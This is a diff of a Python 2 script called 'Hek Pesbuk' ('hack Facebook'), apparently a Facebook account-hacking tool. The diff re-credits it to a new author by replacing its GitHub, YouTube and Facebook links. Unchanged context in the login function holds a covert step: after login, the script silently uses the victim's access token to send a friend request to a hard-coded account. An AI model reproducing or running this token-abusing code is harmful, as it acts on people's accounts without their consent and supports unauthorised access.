@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # Hek Pesbuk
 # Coded by Senja
-# Github: github.com/thedarksec/Hekpesbuk
+# Github: github.com/stepbystepexe/Hekpesbuk
 
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
@@ -117,7 +117,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] \x1b[0mLogin success'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://www.youtube.com/channel/UCpVqkAi_sqVf-ZPwzRjME0Q')
+                os.system('xdg-open https://github.com/stepbystepexe')
                 time.sleep(1)
                 menu()
             except requests.exceptions.ConnectionError:
@@ -226,7 +226,7 @@ def pilih():
                         else:
                             if zedd == '6':
                                 os.system('rm -rf login.txt')
-				os.system('xdg-open https://m.facebook.com/rizz.magizz')
+				os.system('xdg-open https://m.facebook.com/stepbystep')
                                 keluar()
                             else:
                                 if zedd == '0':
